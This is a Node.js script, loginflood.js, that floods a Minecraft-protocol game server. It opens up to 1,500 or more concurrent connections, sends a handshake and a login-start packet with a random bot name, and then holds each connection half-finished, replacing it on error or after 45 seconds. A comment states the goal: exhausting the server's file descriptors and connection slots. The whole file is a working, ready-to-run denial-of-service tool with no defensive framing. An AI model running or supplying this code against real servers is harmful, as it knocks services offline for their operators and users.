// loginflood.js <host> <port> <concurrency>
// Opens half-finished logins and HOLDS them. Server burns a file descriptor
// and a netty slot per connection. Recycles each socket after 45s.
const net = require('net');
const crypto = require('crypto');

const HOST = process.argv[2];
const PORT = +process.argv[3];
const CONC = +(process.argv[4] || 1500);
const PROTO = 774;

const varint = n => {
  const o = []; n >>>= 0;
  do { let b = n & 0x7f; n >>>= 7; if (n) b |= 0x80; o.push(b); } while (n);
  return Buffer.from(o);
};
const frame = p => Buffer.concat([varint(p.length), p]);

const addr = Buffer.from(HOST);
const port = Buffer.alloc(2);
port.writeUInt16BE(PORT);
const HS = frame(Buffer.concat([
  varint(0), varint(PROTO), varint(addr.length), addr, port, varint(2)
]));

function loginStart() {
  const name = Buffer.from('b' + crypto.randomBytes(8).toString('hex').slice(0, 15));
  return frame(Buffer.concat([
    varint(0), varint(name.length), name, crypto.randomBytes(16)
  ]));
}

let held = 0, opens = 0, errs = 0;

function spawn() {
  const s = net.createConnection({ host: HOST, port: PORT });
  let done = false, counted = false;

  const next = () => {
    if (done) return;
    done = true;
    if (counted) { held--; counted = false; }
    s.destroy();
    spawn();
  };

  s.setNoDelay(true);
  s.on('connect', () => {
    counted = true; held++; opens++;
    s.write(Buffer.concat([HS, loginStart()]));
  });
  s.on('error', () => { errs++; next(); });
  s.setTimeout(45000, next);
}

setInterval(() => console.log(`held=${held} total_opened=${opens} errors=${errs}`), 5000);
for (let i = 0; i < CONC; i++) spawn();